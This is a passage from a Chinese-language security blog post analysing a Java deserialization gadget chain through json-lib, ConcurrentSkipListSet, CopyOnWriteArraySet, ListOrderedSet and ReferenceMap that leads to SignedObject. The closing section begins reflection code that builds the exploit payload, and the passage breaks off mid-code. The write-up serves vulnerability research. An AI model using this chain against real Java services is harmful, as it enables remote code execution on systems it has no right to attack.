class="title class_">JSONObject</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;&#x27;object&#x27; is an Annotation.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fromObject 会判断 Object 的类型并做相应处理，SignedObject 类最后会进入 _fromBean 函数。继续往上：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">_processValue</span><span class="params">(Object value, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (JSONNull.getInstance().equals(value)) &#123;</span><br><span class="line">        <span class="keyword">return</span> JSONNull.getInstance();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!Class.class.isAssignableFrom(value.getClass()) &amp;&amp; !(value <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> JSONFunction) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> JSONString) &#123;</span><br><span class="line">            <span class="keyword">return</span> JSONSerializer.toJSON((JSONString)value, jsonConfig);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> JSON) &#123;</span><br><span class="line">            <span class="keyword">return</span> JSONSerializer.toJSON(value, jsonConfig);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (JSONUtils.isArray(value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> JSONArray.fromObject(value, jsonConfig);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (JSONUtils.isString(value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> value.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (JSONUtils.isNumber(value)) &#123;</span><br><span class="line">            JSONUtils.testValidity(value);</span><br><span class="line">            <span class="keyword">return</span> JSONUtils.transformNumber((Number)value);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (JSONUtils.isBoolean(value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONObject.fromObject(value, jsonConfig);</span><br><span class="line">            <span class="keyword">return</span> jsonObject.isNullObject() ? JSONNull.getInstance() : jsonObject;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Class)value).getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AbstractJSON 类的 _processValue 函数，再往上：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> JSONArray <span class="title function_">addValue</span><span class="params">(Object value, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._addValue(<span class="built_in">this</span>.processValue(value, jsonConfig), jsonConfig);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">processValue</span><span class="params">(Object value, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JsonValueProcessor</span> <span class="variable">jsonValueProcessor</span> <span class="operator">=</span> jsonConfig.findJsonValueProcessor(value.getClass());</span><br><span class="line">        <span class="keyword">if</span> (jsonValueProcessor != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = jsonValueProcessor.processArrayValue(value, jsonConfig);</span><br><span class="line">            <span class="keyword">if</span> (!JsonVerifier.isValidJsonValue(value)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;Value is not a valid JSON value. &quot;</span> + value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._processValue(value, jsonConfig);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">_processValue</span><span class="params">(Object value, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (value <span class="keyword">instanceof</span> JSONTokener) &#123;</span><br><span class="line">        <span class="keyword">return</span> _fromJSONTokener((JSONTokener)value, jsonConfig);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value != <span class="literal">null</span> &amp;&amp; Enum.class.isAssignableFrom(value.getClass())) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Enum)value).name();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> Annotation) &amp;&amp; (value == <span class="literal">null</span> || !value.getClass().isAnnotation())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>._processValue(value, jsonConfig);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;Unsupported type&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JSONArray 类，它继承了 AbstractJSON 类，其 addValue 函数最后会调用父类 AbstractJSON 的 _processValue 函数，继续往上，其 _fromCollection 函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">Iterator</span> <span class="variable">elements</span> <span class="operator">=</span> collection.iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(elements.hasNext()) &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">element</span> <span class="operator">=</span> elements.next();</span><br><span class="line">    jsonArray.addValue(element, jsonConfig);</span><br><span class="line">    fireElementAddedEvent(i, jsonArray.get(i++), jsonConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遍历第一个参数 collection，然后调用 addValue。再往上，其 fromObject 函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONArray <span class="title function_">fromObject</span><span class="params">(Object object, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> JSONString) &#123;</span><br><span class="line">        <span class="keyword">return</span> _fromJSONString((JSONString)object, jsonConfig);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> JSONArray) &#123;</span><br><span class="line">        <span class="keyword">return</span> _fromJSONArray((JSONArray)object, jsonConfig);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> Collection) &#123;</span><br><span class="line">        <span class="keyword">return</span> _fromCollection((Collection)object, jsonConfig);</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果参数 Object 为 Collection 类型，就会调用 _fromCollection。再往上：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsAll</span><span class="params">(Collection collection)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.containsAll(collection, <span class="keyword">new</span> <span class="title class_">JsonConfig</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsAll</span><span class="params">(Collection collection, JsonConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.elements.containsAll(fromObject(collection, jsonConfig));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>containsAll 是 List&#x2F;Collection 接口里面的函数，后面的链就好找多了。</p>
<p>ConcurrentSkipListSet 类的 equals 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// Override AbstractSet version to avoid calling size()</span></span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Set))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    Collection&lt;?&gt; c = (Collection&lt;?&gt;) o;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> containsAll(c) &amp;&amp; c.containsAll(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了 c.containsAll，可以用来连接 containsAll，但是有个要求，c 必须是 Set 类型的对象，所以还需要找到一个 containsAll 函数返回值可控的 Set 类，这里找到 ListOrderedSet 类，其 containsAll 函数来自父类 AbstractCollectionDecorator：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsAll</span><span class="params">(Collection coll)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.collection.containsAll(coll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于怎么连接 equals，方法挺多的，最常见的办法就是利用 Map，不过一般情况下都需要一致的 hashCode 才能触发，而 ConcurrentSkipListSet 的 hashCode 计算起来比较复杂，所以再周转一下，找到 CopyOnWriteArraySet 类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Set))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    Set&lt;?&gt; set = (Set&lt;?&gt;)(o);</span><br><span class="line">    Iterator&lt;?&gt; it = set.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Uses O(n^2) algorithm that is only appropriate</span></span><br><span class="line">    <span class="comment">// for small sets, which CopyOnWriteArraySets should be.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//  Use a single snapshot of underlying array</span></span><br><span class="line">    Object[] elements = al.getArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">    <span class="comment">// Mark matched elements to avoid re-checking</span></span><br><span class="line">    <span class="type">boolean</span>[] matched = <span class="keyword">new</span> <span class="title class_">boolean</span>[len];</span><br><span class="line">    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    outer: <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (++k &gt; len)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">x</span> <span class="operator">=</span> it.next();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matched[i] &amp;&amp; eq(x, elements[i])) &#123;</span><br><span class="line">                matched[i] = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">continue</span> outer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k == len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">eq</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (o1 == <span class="literal">null</span>) ? o2 == <span class="literal">null</span> : o1.equals(o2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遍历参数 o，然后依次跟自身属性 al 中的元素调用 eq 作比较。而其 hashCode 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Iterator&lt;E&gt; i = iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">obj</span> <span class="operator">=</span> i.next();</span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="literal">null</span>)</span><br><span class="line">            h += obj.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> al.iterator();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，其 hashCode 同样来自属性 al，所以我们可以使用两个元素相同顺序不同的 CopyOnWriteArraySet，里面存放 ConcurrentSkipListSet 和 ListOrderedSet 对象，这样就可以以 ListOrderedSet 为参数触发 ConcurrentSkipListSet 的 equals 函数了。</p>
<p>能触发 equals 的 map，payload 中采用的是 ReferenceMap，其 readObject 如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    <span class="built_in">this</span>.doReadObject(in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>doReadObject 来自父类 AbstractReferenceMap：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doReadObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="built_in">this</span>.keyType = in.readInt();</span><br><span class="line">    <span class="built_in">this</span>.valueType = in.readInt();</span><br><span class="line">    <span class="built_in">this</span>.purgeValues = in.readBoolean();</span><br><span class="line">    <span class="built_in">this</span>.loadFactor = in.readFloat();</span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">    <span class="built_in">this</span>.init();</span><br><span class="line">    <span class="built_in">this</span>.data = <span class="keyword">new</span> <span class="title class_">HashEntry</span>[capacity];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.threshold = <span class="built_in">this</span>.calculateThreshold(<span class="built_in">this</span>.data.length, <span class="built_in">this</span>.loadFactor);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">        <span class="built_in">this</span>.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是 put：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;null keys not allowed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;null values not allowed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.purgeBeforeWrite();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.convertKey(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> <span class="built_in">this</span>.hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="built_in">this</span>.hashIndex(hashCode, <span class="built_in">this</span>.data.length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(AbstractHashedMap.<span class="type">HashEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="built_in">this</span>.data[index]; entry != <span class="literal">null</span>; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry.hashCode == hashCode &amp;&amp; <span class="built_in">this</span>.isEqualKey(key, entry.key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">oldValue</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="built_in">this</span>.updateEntry(entry, value);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.addMapping(index, hashCode, key, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isEqualKey</span><span class="params">(Object key1, Object key2)</span> &#123;</span><br><span class="line">    key2 = <span class="built_in">this</span>.keyType &gt; <span class="number">0</span> ? ((Reference)key2).get() : key2;</span><br><span class="line">    <span class="keyword">return</span> key1 == key2 || key1.equals(key2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>观察参考文章的 payload，可以发现其是通过 HTTP 方式触发的，还用到了两个奇怪的类，通过 writeReplace 进行序列化，可能是为了避免生成对象的过程中触发某些奇特操作，还是用反射的方式写吧。</p>
<p>首先生成序列化数据测试一下先：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> (SignedObject)createWithoutConstructor(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">setField(signedObject, <span class="string">&quot;content&quot;</span>, getPOC());</span><br><span class="line">setField(signedObject, <span class="string">&quot;signature&quot;</span>, <span class="string">&quot;Twings&quot;</span>.getBytes());</span><br><span class="line">setField(signedObject, <span class="string">&quot;thealgorithm&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line"><span class="type">ListOrderedSet</span> <span class="variable">listOrderedSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListOrderedSet</span>();</span><br><span class="line">setField(listOrderedSet, <span class="string">&quot;collection&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line"><span class="type">ConcurrentSkipListSet</span> <span class="variable">concurrentSkipListSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcurrentSkipListSet</span>();</span><br><span class="line">concurrentSkipListSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> getFieldValue(concurrentSkipListSet, <span class="string">&quot;m&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">head</span> <span class="operator">=</span> getFieldValue(m, <span class="string">&quot;head&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> getFieldValue(head, <span class="string">&quot;node&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">next</span> <span class="operator">=</span> getFieldValue(node, <span class="string">&quot;next&quot;</span>);</span><br><span class="line">setField(next, <span class="string">&quot;key&quot;</span>, signedObject);</span><br><span class="line"></span><br><span class="line"><span class="type">CopyOnWriteArrayList</span> <span class="variable">copyOnWriteArrayList1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>();</span><br><span class="line">copyOnWriteArrayList1.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">copyOnWriteArrayList1.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">Object[] array1 = (Object[])getFieldValue(copyOnWriteArrayList1, <span class="string">&quot;array&quot;</span>);</span><br><span class="line">array1[<span class="number">0</span>] = listOrderedSet;</span><br><span class="line">array1[<span class="number">1</span>] = concurrentSkipListSet;</span><br><span class="line"></span><br><span class="line"><span class="type">CopyOnWriteArrayList</span> <span class="variable">copyOnWriteArrayList2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>();</span><br><span class="line">copyOnWriteArrayList2.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">copyOnWriteArrayList2.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">Object[] array2 = (Object[])getFieldValue(copyOnWriteArrayList2, <span class="string">&quot;array&quot;</span>);</span><br><span class="line">array2[<span class="number">0</span>] = concurrentSkipListSet;</span><br><span class="line">array2[<span class="number">1</span>] = listOrderedSet;</span><br><span class="line"></span><br><span class="line"><span class="type">CopyOnWriteArraySet</span> <span class="variable">copyOnWriteArraySet1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CopyOnWriteArraySet</span>();</span><br><span class="line">setField(copyOnWriteArraySet1, <span class="string">&quot;al&quot;</span>, copyOnWriteArrayList1);</span><br><span class="line"></span><br><span class="line"><span class="type">CopyOnWriteArraySet</span> <span class="variable">copyOnWriteArraySet2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CopyOnWriteArraySet</span>();</span><br><span class="line">setField(copyOnWriteArraySet2, <span class="string">&quot;al&quot;</span>, 